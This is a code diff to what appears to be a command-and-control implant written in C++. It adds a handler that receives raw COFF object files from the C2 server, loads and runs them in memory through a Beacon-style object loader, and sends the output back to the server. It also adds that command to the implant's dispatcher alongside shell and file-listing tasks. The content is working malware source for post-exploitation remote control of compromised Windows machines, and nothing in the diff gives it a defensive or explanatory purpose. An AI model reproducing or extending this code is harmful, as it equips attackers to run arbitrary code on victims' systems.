@@ -3,6 +3,7 @@
 #include <Agent.h>
 #include <Defines.h>
 #include <Internals.h>
+#include <Bof.h>
 
 // Send a taks result back to C2
 // task_uuid: the 36-byte UUID from the inbound taks (tells server which task this answers)
@@ -249,6 +250,48 @@ static void Task_Ls( PCHAR task_uuid, PPARSER args )
     Heap_Free( out_buf );
 }
 
+// BOF Execute - laod a COFF .o file, run go(), send output back
+static void Task_Bof( PCHAR task_uuid, PPARSER args )
+{
+    G_AGENT;
+
+    // first arg: the raw .o file bytes
+    UINT32 bof_size = 0;
+    PBYTE bof_data = Psr_Bytes( args, &bof_size );
+    if ( !bof_data || bof_size == 0 ) return;
+
+    // second arg: packed arguments for the BOF (may be empty)
+    UINT32 arg_size = 0;
+    PBYTE arg_data = Psr_Bytes( args, & arg_size );
+
+    // zero the output accumulator before running
+    Self->Bof.OutputBuf = nullptr;
+    Self->Bof.OutputLen = 0;
+    Self->Bof.OutputCap = 0;
+
+    // COM must be initialized for BOFs that use CLR (execute-assembly) or OLEAUT32.
+    // CoInitializeEx returns S_FALSE if already initialized - safe to call every time.
+    typedef HRESULT (WINAPI *fnCoInitializeEx)(LPVOID, DWORD);
+    PVOID hOle32 = (PVOID)Self->Krnl32.LoadLibraryA( (PCHAR)"ole32.dll" );
+    if ( hOle32 ) {
+        auto CoInitEx = (fnCoInitializeEx)Self->Krnl32.GetProcAddress( (HMODULE)hOle32, (PCHAR)"CoInitializeEx" );
+        if ( CoInitEx ) CoInitEx( nullptr, 0x0 ); // COINIT_MULTITHREADED
+    }
+
+    // run the BOF
+    Bof_Loader( bof_data, bof_size, arg_data, arg_size );
+
+    // send whatever the BOF printed via BeaconOutput/BeaconPrintf
+    Task_SendResult( task_uuid, Self->Bof.OutputBuf, Self->Bof.OutputLen );
+
+    // free the output buffer
+    if ( Self->Bof.OutputBuf ) Heap_Free( Self->Bof.OutputBuf );
+    Self->Bof.OutputBuf = nullptr;
+    Self->Bof.OutputLen = 0;
+    Self->Bof.OutputCap = 0;
+
+}
+
 // Dispatcher
 
 // Parse the server's poll response and dispatch each task to its handler
@@ -290,6 +333,7 @@ DECLFN BOOL Task_Dispatch( PVOID buf, UINT32 buf_len )
             case CMD_SHELL:  Task_Shell( task_uuid, &args ); break;
             case CMD_PWD:    Task_Pwd  ( task_uuid, &args ); break;
             case CMD_LS:     Task_Ls   ( task_uuid, &args ); break;
+            case CMD_BOF:    Task_Bof  ( task_uuid, &args ); break;
             default: break;
         }
 
